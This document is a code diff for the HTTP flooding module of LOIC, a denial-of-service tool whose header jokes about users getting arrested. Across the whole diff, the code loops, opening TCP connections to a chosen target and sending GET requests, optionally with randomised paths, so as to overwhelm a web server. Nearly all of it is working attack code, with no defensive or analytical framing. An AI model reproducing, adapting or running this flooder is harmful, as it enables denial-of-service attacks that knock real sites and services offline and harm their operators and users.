@@ -1,101 +1,128 @@
+/* LOIC - Low Orbit Ion Cannon
+ * Released to the public domain
+ * Enjoy getting v&, kids.
+ */
+
 using System;
 using System.ComponentModel;
+using System.Net;
 using System.Net.Sockets;
+using System.Windows.Forms;
 
 namespace LOIC
 {
 	public class HTTPFlooder : cHLDos
 	{
-		public string IP { get; set; }
-		public string DNS { get; set; }
-		public int Port { get; set; }
-		public string Subsite { get; set; }
-		public bool Resp { get; set; }
+		private BackgroundWorker bw;
+		private Timer tTimepoll;
+		private bool intShowStats;
+		private long lastAction;
 
-		private Random rnd = new Random();
-		private bool random;
-		private bool usegZip;
+		private readonly string Host;
+		private readonly string IP;
+		private readonly int Port;
+		private readonly string Subsite;
+		private readonly bool Resp;
+		private readonly bool AllowRandom;
+		private readonly bool AllowGzip;
 
-		public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip)
+		public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool gzip)
 		{
-			this.IsDelayed = false;
-			this.DNS = (dns == "") ? ip : dns;
+			this.Host = (host == "") ? ip : host;
 			this.IP = ip;
 			this.Port = port;
 			this.Subsite = subSite;
 			this.Resp = resp;
 			this.Delay = delay;
 			this.Timeout = timeout * 1000;
-			this.random = random;
-			this.usegZip = usegzip;
+			this.AllowRandom = random;
+			this.AllowGzip = gzip;
 		}
 		public override void Start()
 		{
-			IsDelayed = false;
-			IsFlooding = true;
-			var bw = new BackgroundWorker();
-			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
-			bw.RunWorkerAsync();
-		}
+			this.IsFlooding = true;
 
+			lastAction = Tick();
+			tTimepoll = new Timer();
+			tTimepoll.Tick += tTimepoll_Tick;
+			tTimepoll.Start();
+
+			this.bw = new BackgroundWorker();
+			this.bw.DoWork += bw_DoWork;
+			this.bw.RunWorkerAsync();
+			this.bw.WorkerSupportsCancellation = true;
+		}
+		public override void Stop()
+		{
+			this.IsFlooding = false;
+			this.bw.CancelAsync();
+		}
+		private void tTimepoll_Tick(object sender, EventArgs e)
+		{
+			// Protect against race condition
+			if(intShowStats) return; intShowStats = true;
+
+			if(Tick() > lastAction + Timeout)
+			{
+				Failed++; State = ReqState.Failed;
+				tTimepoll.Stop();
+				if(this.IsFlooding)
+					tTimepoll.Start();
+			}
+
+			intShowStats = false;
+		}
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
 			{
-				int bfsize = 1024; // this should be less than the MTU
-				byte[] buf;
-				if (random == true)
-				{
-					buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}{4}{2}", Subsite, Functions.RandomString(), Environment.NewLine, DNS, ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine): "")));
-				}
-				else
-				{
-					buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}Host: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}{3}{1}", Subsite, Environment.NewLine, DNS, ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine): "")));
-				}
-
-				byte[] recvBuf = new byte[bfsize];
-				int recvd = 0;
-				while (IsFlooding)
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
+				while (this.IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
-					try
+					lastAction = Tick();
+					byte[] recvBuf = new byte[128];
+					using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
 					{
-						var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+						socket.NoDelay = true;
 						State = ReqState.Connecting; // SET STATE TO CONNECTING //
-						socket.Connect(((IP == "") ? DNS : IP), Port); //(host)
+
+						try { socket.Connect(RHost); }
+						catch(SocketException) { goto _continue; }
+
+						byte[] buf = Functions.RandomHttpHeader("GET", Subsite, Host, AllowRandom, AllowGzip);
+
 						socket.Blocking = Resp;
 						State = ReqState.Requesting; // SET STATE TO REQUESTING //
-						socket.ReceiveTimeout = Timeout;
-						socket.Send(buf, SocketFlags.None);
-						State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
-						if (Resp)
+
+						try
 						{
-							try
+							socket.Send(buf, SocketFlags.None);
+							State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
+
+							if (Resp)
 							{
-								recvd = 0;
-								do
-								{
-									recvd = socket.Receive(recvBuf);
-								} while ((recvd > bfsize) && socket.Connected);
-								Downloaded++;
-							}
-							catch
-							{ // timeout reached - epic win?
-								Failed++;
+								socket.ReceiveTimeout = Timeout;
+								socket.Receive(recvBuf, recvBuf.Length, SocketFlags.None);
 							}
 						}
-						socket.Close(); // let's close the socket - there are other methods for socket-starving!
-						State = ReqState.Completed;  // SET STATE TO COMPLETED
+						catch(SocketException) { goto _continue; }
 					}
-					catch
-					{ // host unreachable == epic win!
-						Failed++;
-					}
-					if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
+					tTimepoll.Stop();
+					tTimepoll.Start();
+_continue:
+					if(Delay >= 0)
+						System.Threading.Thread.Sleep(Delay+1);
 				}
 			}
+			// Analysis disable once EmptyGeneralCatchClause
 			catch { }
-			finally { IsFlooding = false; }
+			finally { tTimepoll.Stop(); State = ReqState.Ready; this.IsFlooding = false; }
+		}
+		private static long Tick()
+		{
+			return DateTime.UtcNow.Ticks / 10000;
 		}
 	}
 }
